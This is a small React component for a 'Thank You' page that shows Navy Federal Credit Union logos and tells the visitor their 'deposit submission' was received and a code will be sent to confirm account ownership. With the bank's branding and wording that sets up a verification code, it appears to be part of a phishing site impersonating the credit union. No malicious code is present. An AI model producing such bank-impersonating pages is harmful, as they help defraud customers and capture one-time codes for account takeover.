import React from 'react'

const ThankYou = () => {
    return (
        <>
          <img src="/assets/nfcu.jpg" alt="logo" className="w-full"  />

        <div className="container w-full sm:w-[60%] md:w-[60%] lg:w-[30%] mx-auto mt-24 px-4">
      <div className="flex flex-col items-center justify-center space-y-4 p-3 rounded-md shadow-xl border border-gray-100">
          <img className="w-64" src="assets/navy.jpg" alt="Navy Federal Credit Union Logo" />
          
        <h2>Thank You!</h2>
        <h1>Your deposit submission has been received, a code would be sent to confirm ownership of the account.</h1>
          </div>
          </div>
      </>
  )
}

export default ThankYou